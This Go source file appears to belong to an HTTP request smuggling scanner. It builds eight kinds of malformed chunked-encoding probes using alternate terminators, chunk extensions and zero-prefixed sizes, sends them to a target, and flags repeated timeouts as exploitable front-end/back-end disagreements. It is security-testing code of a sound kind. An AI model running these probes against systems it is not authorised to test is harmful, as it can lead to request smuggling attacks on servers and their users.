package scan

// chunksizes.go — Chunk size / terminator parsing discrepancy probes
//
// Maps to ChunkSizeScan.java (James Kettle / PortSwigger 2025).
// Reference: https://w4ke.info/2025/06/18/funky-chunks.html
//
// Techniques detect disagreements between front-end and back-end on how
// alternative line terminators or chunk-extension fields are counted
// when determining the boundary of a chunk body.
//
// Eight variants:
//   TERM.EXT   — alternate terminator in chunk extension; sizes disagree
//   EXT.TERM   — chunk extension followed by alternate terminator
//   TERM.SPILL — alternate terminator inside chunk body causes size spill
//   SPILL.TERM — oversized chunk with alternate terminator inside body
//   ONE.TWO    — body with alternate terminator; FE counts 1 byte, BE counts 2
//   TWO.ONE    — inverse of ONE.TWO
//   ZERO.TWO   — zero-prefix on chunk size; BE counts differently
//   TWO.ZERO   — two-byte size with zero-prefix on second chunk

import (
	"github.com/smuggled/smuggled/internal/request"
	"github.com/smuggled/smuggled/internal/config"
	"fmt"
	"net/url"

	"github.com/smuggled/smuggled/internal/report"
)

// altTerminators are the non-standard line endings to try.
var altTerminators = []string{"\n", "\r", "\rX", "\r\r"}

// ScanChunkSizes runs all 8 chunk-size parsing discrepancy probes.
func ScanChunkSizes(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}
	path := target.RequestURI()
	if path == "" {
		path = "/"
	}

	method := config.EffectiveMethod(cfg, true)

	builders := []struct {
		name  string
		terms []string
		build func(method, path, host, term string) []byte
	}{
		{"TERM.EXT", altTerminators, buildTermExt},
		{"EXT.TERM", altTerminators, buildExtTerm},
		{"TERM.SPILL", append(altTerminators, "", "XX"), buildTermSpill},
		{"SPILL.TERM", append(altTerminators, "", "XX"), buildSpillTerm},
		{"ONE.TWO", []string{"\n", "\r"}, buildOneTwo},
		{"TWO.ONE", []string{"\n", "\r"}, buildTwoOne},
		{"ZERO.TWO", []string{""}, buildZeroTwo},
		{"TWO.ZERO", []string{""}, buildTwoZero},
	}

	for _, b := range builders {
		for _, term := range b.terms {
			payload := b.build(method, path, host, term)
			rep.Log("ChunkSize %s term=%q target=%s", b.name, term, host)

			_, _, timedOut, err := request.RawRequest(target, payload, cfg)
			if err != nil {
				continue
			}
			if !timedOut {
				continue
			}

			// Confirm
			confirmed := 0
			for i := 0; i < cfg.ConfirmReps+2; i++ {
				_, _, to, e := request.RawRequest(target, payload, cfg)
				if e == nil && to {
					confirmed++
				}
			}
			if confirmed < cfg.ConfirmReps {
				continue
			}

			displayTerm := fmt.Sprintf("%q", term)
			rep.Emit(report.Finding{
				Target:    target.String(),
				Method:      config.EffectiveMethods(cfg)[0],
				Severity:  report.SeverityConfirmed,
				Type:      "chunk-size-" + b.name,
				Technique: b.name + "/" + displayTerm,
				Description: fmt.Sprintf(
					"%s: repeated timeout with alternate terminator %s in chunk body. "+
						"Front-end and back-end disagree on chunk boundary — exploitable for HRS.",
					b.name, displayTerm),
				RawProbe: request.Truncate(string(payload), 512),
			})
			rep.Log("ChunkSize [!] %s/%s confirmed on %s", b.name, displayTerm, target.String())
		}
	}
}

// ─── Payload builders ────────────────────────────────────────────────────────
// Each mirrors the exact Java payload structure from ChunkSizeScan.java.

func chunkHeader(method, path, host string) string {
	return fmt.Sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n",
		method, path, host)
}

// TERM.EXT: chunk extension with alternate terminator; two conflicting chunk sizes follow
//
//	2;<term>XX\r\n   ← FE reads "2", BE reads differently due to <term>
//	10\r\n
//	1f\r\n
//	AAAABBBBCCCC\r\n
//	0\r\n\r\n
//	DDDDEEEEFFFF\r\n
//	0\r\n\r\n
func buildTermExt(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "2;" + term + "XX\r\n"
	s += "10\r\n"
	s += "1f\r\n"
	s += "AAAABBBBCCCC\r\n"
	s += "0\r\n\r\n"
	s += "DDDDEEEEFFFF\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}

// EXT.TERM
//
//	2;<term>XX\r\n
//	22\r\n
//	c\r\n
//	AAAABBBBCCCC\r\n
//	0\r\n\r\n
//	DDDDEEEEFFFF\r\n
//	0\r\n\r\n
func buildExtTerm(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "2;" + term + "XX\r\n"
	s += "22\r\n"
	s += "c\r\n"
	s += "AAAABBBBCCCC\r\n"
	s += "0\r\n\r\n"
	s += "DDDDEEEEFFFF\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}

// TERM.SPILL: alternate terminator embedded inside chunk body causes a size spill
//
//	5\r\n
//	AAAAA<term>c\r\n
//	17\r\n
//	AAAABBBB\r\n
//	0\r\n\r\n
//	CCCCDDDD\r\n
//	0\r\n\r\n
func buildTermSpill(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "5\r\n"
	s += "AAAAA" + term + "c\r\n"
	s += "17\r\n"
	s += "AAAABBBB\r\n"
	s += "0\r\n\r\n"
	s += "CCCCDDDD\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}

// SPILL.TERM
//
//	5\r\n
//	AAAAA<term>1a\r\n
//	8\r\n
//	AAAABBBB\r\n
//	0\r\n\r\n
//	CCCCDDDD\r\n
//	0\r\n\r\n
func buildSpillTerm(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "5\r\n"
	s += "AAAAA" + term + "1a\r\n"
	s += "8\r\n"
	s += "AAAABBBB\r\n"
	s += "0\r\n\r\n"
	s += "CCCCDDDD\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}

// ONE.TWO
//
//	2\r\n
//	XX<term>
//	12\r\n
//	XX\r\n
//	19\r\n
//	XXAAAABBBB\r\n
//	0\r\n\r\n
//	CCCCDDDD\r\n
//	0\r\n\r\n
func buildOneTwo(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "2\r\n"
	s += "XX" + term
	s += "12\r\n"
	s += "XX\r\n"
	s += "19\r\n"
	s += "XXAAAABBBB\r\n"
	s += "0\r\n\r\n"
	s += "CCCCDDDD\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}

// TWO.ONE
//
//	2\r\n
//	XX<term>
//	10\r\n
//	\r\n
//	AAAABBBBCCCCDD\r\n
//	0\r\n\r\n
func buildTwoOne(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "2\r\n"
	s += "XX" + term
	s += "10\r\n"
	s += "\r\n"
	s += "AAAABBBBCCCCDD\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}

// ZERO.TWO — zero-prefixed chunk size
//
//	2\r\n
//	XX<term>
//	012\r\n
//	XX\r\n
//	19\r\n
//	XXAAAABBBB\r\n
//	0\r\n\r\n
//	CCCCDDDD\r\n
//	0\r\n\r\n
func buildZeroTwo(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "2\r\n"
	s += "XX" + term
	s += "012\r\n"
	s += "XX\r\n"
	s += "19\r\n"
	s += "XXAAAABBBB\r\n"
	s += "0\r\n\r\n"
	s += "CCCCDDDD\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}

// TWO.ZERO
//
//	2\r\n
//	xx<term>
//	010\r\n
//	\r\n
//	AAAABBBBCCCCDD\r\n
//	0\r\n\r\n
func buildTwoZero(method, path, host, term string) []byte {
	s := chunkHeader(method, path, host)
	s += "2\r\n"
	s += "xx" + term
	s += "010\r\n"
	s += "\r\n"
	s += "AAAABBBBCCCCDD\r\n"
	s += "0\r\n\r\n"
	return []byte(s)
}
